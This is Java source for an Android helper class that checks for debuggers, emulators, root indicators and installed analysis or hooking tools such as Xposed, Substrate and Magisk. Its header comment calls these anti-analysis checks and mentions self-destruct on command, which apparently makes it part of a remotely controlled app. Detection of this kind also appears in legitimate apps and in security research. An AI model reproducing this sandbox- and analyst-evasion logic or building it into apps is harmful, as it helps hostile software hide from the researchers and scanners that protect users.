package com.java.panel;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Debug;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.List;

/**
 * Basic anti-analysis / environment checks.
 * Detects emulator, debugger, common analysis packages, root indicators.
 * Used for awareness — does not self-destruct unless commanded.
 */
public class AntiAnalysisHelper {

    private static final String[] EMULATOR_FILES = {
            "/dev/socket/qemud", "/dev/qemu_pipe", "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace", "/system/bin/qemu-props"
    };

    private static final String[] ROOT_PATHS = {
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
            "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"
    };

    private static final String[] SUSPICIOUS_PACKAGES = {
            "com.mwr.dz", "com.saurik.substrate", "de.robv.android.xposed.installer",
            "com.android.vending.billing.InAppBillingService.COIN",
            "com.chelpus.lackypatch", "com.ramdroid.appquarantine",
            "com.topjohnwu.magisk", "eu.chainfire.supersu",
            "com.noshufou.android.su", "com.koushikdutta.superuser",
            "com.thirdparty.superuser", "com.yellowes.su",
            "com.koushikdutta.rommanager", "com.dimonvideo.luckypatcher",
            "com.chelpus.luckypatcher", "com.android.vending.billing.InAppBillingService.LOCK",
            "bin.mt.plus", "com.android.chrome" // placeholder noise filtered below
    };

    public static String fullReport(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("🕵️ Anti-analysis report\n\n");
        sb.append(checkDebugger());
        sb.append(checkEmulator());
        sb.append(checkRoot());
        sb.append(checkSuspiciousPackages(ctx));
        sb.append(checkInstaller(ctx));
        return sb.toString();
    }

    public static String checkDebugger() {
        boolean dbg = Debug.isDebuggerConnected() || Debug.waitingForDebugger();
        return "• Debugger attached: " + (dbg ? "⚠️ YES" : "NO") + "\n";
    }

    public static String checkEmulator() {
        boolean emu = false;
        String reason = "";
        try {
            String fp = Build.FINGERPRINT != null ? Build.FINGERPRINT : "";
            String model = Build.MODEL != null ? Build.MODEL : "";
            String man = Build.MANUFACTURER != null ? Build.MANUFACTURER : "";
            String brand = Build.BRAND != null ? Build.BRAND : "";
            String device = Build.DEVICE != null ? Build.DEVICE : "";
            String product = Build.PRODUCT != null ? Build.PRODUCT : "";

            if (fp.contains("generic") || fp.contains("unknown")
                    || model.contains("google_sdk") || model.contains("Emulator")
                    || model.contains("Android SDK") || man.contains("Genymotion")
                    || (brand.startsWith("generic") && device.startsWith("generic"))
                    || product.equals("google_sdk") || product.contains("sdk")) {
                emu = true;
                reason = "build props";
            }
            for (String path : EMULATOR_FILES) {
                if (new File(path).exists()) {
                    emu = true;
                    reason = path;
                    break;
                }
            }
        } catch (Exception ignored) {}
        return "• Emulator: " + (emu ? "⚠️ YES (" + reason + ")" : "NO") + "\n";
    }

    public static String checkRoot() {
        boolean rooted = false;
        String found = "";
        for (String path : ROOT_PATHS) {
            if (new File(path).exists()) {
                rooted = true;
                found = path;
                break;
            }
        }
        if (!rooted) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"which", "su"});
                BufferedReader br = new BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
                String line = br.readLine();
                br.close();
                if (line != null && line.contains("su")) {
                    rooted = true;
                    found = line.trim();
                }
            } catch (Exception ignored) {}
        }
        return "• Root indicators: " + (rooted ? "⚠️ YES (" + found + ")" : "NO") + "\n";
    }

    public static String checkSuspiciousPackages(Context ctx) {
        List<String> found = new ArrayList<>();
        try {
            PackageManager pm = ctx.getPackageManager();
            for (String pkg : SUSPICIOUS_PACKAGES) {
                if (pkg.equals("com.android.chrome")) continue;
                try {
                    pm.getPackageInfo(pkg, 0);
                    found.add(pkg);
                } catch (PackageManager.NameNotFoundException ignored) {}
            }
        } catch (Exception ignored) {}
        if (found.isEmpty()) return "• Suspicious packages: none\n";
        return "• Suspicious packages: ⚠️ " + found.toString() + "\n";
    }

    public static String checkInstaller(Context ctx) {
        try {
            String installer = ctx.getPackageManager().getInstallerPackageName(ctx.getPackageName());
            return "• Installer package: " + (installer != null ? installer : "sideload/unknown") + "\n";
        } catch (Exception e) {
            return "• Installer: unknown\n";
        }
    }

    public static boolean isDebuggable(Context ctx) {
        try {
            return (ctx.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
        } catch (Exception e) {
            return false;
        }
    }
}
